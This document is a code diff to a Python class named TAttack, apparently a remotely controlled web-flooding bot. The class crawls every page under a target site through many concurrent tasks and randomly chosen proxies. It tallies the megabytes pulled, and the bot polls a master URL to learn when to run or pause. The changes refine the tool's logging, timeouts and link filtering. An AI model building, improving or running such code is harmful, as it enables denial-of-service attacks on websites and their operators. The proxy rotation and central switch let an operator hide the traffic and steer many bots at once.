@@ -68,7 +68,8 @@ class TAttack():
             return ProxyConnector.from_url(random.choice(Proxies))
 
     async def _GrabHref(self, aUrl: str, aData: str, aStatus: int, aTaskId: int, aDuration: float):
-        self.TotalData += len(aData)
+        Size = len(aData)
+        self.TotalData += Size
         self.UrlDone += 1
 
         Soup = BeautifulSoup(aData, "lxml")
@@ -83,14 +84,15 @@ class TAttack():
 
                 if (Href.startswith(self.UrlRoot)) and \
                    (not Href.startswith('#')) and \
-                   (not Ext in ['.zip', '.jpg', '.png']) and \
+                   (not Ext in ['.zip', '.pdf', '.jpg', '.png']) and \
                    (not Href in self.Urls):
                     self.Urls.append(Href)
                     self.Queue.put_nowait(Href)
-        await self._DoGrab(aUrl, aStatus, aTaskId, aDuration)
+        await self._DoGrab(aUrl, aStatus, aTaskId, aDuration, Size)
 
     async def _Worker(self, aTaskId: int):
         await asyncio.sleep(aTaskId)
+        Timeout = 5
 
         while (True):
             await self.Event.wait()
@@ -98,18 +100,23 @@ class TAttack():
 
             if (self.Queue.empty()):
                 break
-            Url = await self.Queue.get()
 
             try:
+                Url = await asyncio.wait_for(self.Queue.get(), timeout=Timeout)
+    
                 async with aiohttp.ClientSession(connector=self._GetConnector()) as Session:
                     TimeStart = time.time()
                     async with Session.get(Url, headers=self._GetHeaders()) as Response:
                         Data = await Response.read()
                         await self._GrabHref(Url, Data, Response.status, aTaskId, time.time() - TimeStart)
             except (aiohttp.ClientConnectorError, aiohttp.ClientError) as E:
-                    self._Log('Err:%s, %s', (E, Url))
+                self._Log('Err:%s, %s' % (Url, E))
+            except asyncio.TimeoutError:
+                print('Err:%s, queue timeout %d' % (self.UrlRoot, Timeout))
             except Exception as E:
-                print('Err', E, Url)
+                print('Err:', Url, E)
+
+        print('Done %s, task %d' % (self.UrlRoot, aTaskId))
 
     def Wait(self, aEnable: bool):
         if (aEnable):
@@ -120,11 +127,12 @@ class TAttack():
     async def Run(self, aMaxTasks: int):
         Tasks = [asyncio.create_task(self._Worker(i)) for i in range(aMaxTasks)]
         await asyncio.gather(*Tasks)
+        print('Done %s' % (self.UrlRoot))
 
 
 class TAttackLog(TAttack):
-    async def _DoGrab(self, aUrl: str, aStatus: int, aTaskId: int, aDuration: float):
-        Msg = 'task:%d, status:%d, found:%d, done:%d, total:%dM, duration:%.3f, %s;' % (aTaskId, aStatus, len(self.Urls), self.UrlDone, self.TotalData / 1000000, aDuration, aUrl)
+    async def _DoGrab(self, aUrl: str, aStatus: int, aTaskId: int, aDuration: float, aSize: int):
+        Msg = 'task:%3d, status:%d, found:%4d, done:%4d, total:%5dM, size:%4dK, time:%7.3f, %s' % (aTaskId, aStatus, len(self.Urls), self.UrlDone, self.TotalData/1000000, aSize/1000, aDuration, aUrl)
         self._Log(Msg)
  
   
@@ -178,6 +186,7 @@ class TMain():
 
     async def Run(self):
         while (True):
+            print('Check loader')
             if (await self.Loader.FromUrl(MasterUrl)):
                 self.Wait(not self.Loader.Data['run'])
 
